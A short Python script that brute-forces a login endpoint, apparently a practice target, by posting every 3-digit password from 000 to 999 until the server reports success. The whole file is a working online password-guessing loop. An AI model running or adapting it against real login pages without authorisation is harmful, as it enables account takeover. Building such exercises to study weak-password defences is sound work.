import requests
import time

LOGIN_URL = "https://password-founder.onrender.com/login"

print("Starting password test...")
print("Testing 3-digit passwords from 000 to 999\n")

for number in range(1000):
    password = f"{number:03d}"

    try:
        response = requests.post(
            LOGIN_URL,
            json={"password": password},
            timeout=60
        )

        # Confirm the server returned JSON
        if "application/json" not in response.headers.get("Content-Type", ""):
            print("Unexpected response from server.")
            print("HTTP status:", response.status_code)
            print("Response preview:", response.text[:300])
            break

        result = response.json()

        print(f"Trying: {password}")

        if response.ok and result.get("success") is True:
            print("\nPassword found!")
            print(f"Correct password: {password}")
            break

        # Pause between attempts
        time.sleep(0.1)

    except requests.RequestException as error:
        print("Request failed:", error)
        break

else:
    print("\nNo correct password found.")